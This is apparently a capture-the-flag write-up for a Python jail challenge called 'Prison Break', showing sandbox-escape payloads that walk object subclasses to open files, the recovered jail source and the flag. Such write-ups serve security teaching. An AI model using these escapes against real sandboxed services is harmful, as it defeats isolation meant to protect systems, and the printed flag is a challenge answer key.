---
layout: post
title: "Prison Break"
author: "vishalananth"
tags: ['Miscellaneous']
---

I saw them put someone in jail. Can you find out who it is? They said this is the best prison ever built. You sure can't break it, can you?

nc chall.csivit.com 30407

## Solution

We netcat into the given IP and notice that the python interpreter is open and many common commands are banned. So like with any python jail we try different things to bypass the banned commands. We see
`print(dir())` works and hence decide to proceed along those lines. We try

```python
print(dir(__builtins__))
```
We then try

```python
print(().__class__.__base__.__subclasses__())
```

This prints a lot of useful classes among which was the `file` class. So we try to open the flag file with

```python
print(().__class__.__base__.__subclasses__()[40]("flag.txt","r").read())
```

We see it does not have the flag and asks us to check the source code for flag. So I randomly tried

```python
print(().__class__.__base__.__subclasses__()[40]("jail.py","r").read())
```

and got the source code which had the flag

```python
#!/usr/bin/python

import sys

class Sandbox(object):
    def execute(self, code_string):
        exec(code_string)
        sys.stdout.flush()

sandbox = Sandbox()

_raw_input = raw_input

main = sys.modules["__main__"].__dict__
orig_builtins = main["__builtins__"].__dict__

builtins_whitelist = set((
    #exceptions
    'ArithmeticError', 'AssertionError', 'AttributeError', 'Exception',

    #constants
    'False', 'None', 'True',

    #types
    'basestring', 'bytearray', 'bytes', 'complex', 'dict',

    #functions
    'abs', 'bin', 'dir', 'help'

    # blocked: eval, execfile, exit, file, quit, reload, import, etc.
))

for builtin in orig_builtins.keys():
    if builtin not in builtins_whitelist:
        del orig_builtins[builtin]

print("Find the flag.")
sys.stdout.flush()

def flag_function():
    flag = "csictf{m1ch34l_sc0fi3ld_fr0m_pr1s0n_br34k}"

while 1:
    try:
        sys.stdout.write(">>> ")
        sys.stdout.flush()
        code = _raw_input()
        sandbox.execute(code)

    except Exception:
        print("You have encountered an error.")
        sys.stdout.flush()
```


## Flag
```
csictf{m1ch34l_sc0fi3ld_fr0m_pr1s0n_br34k}
```

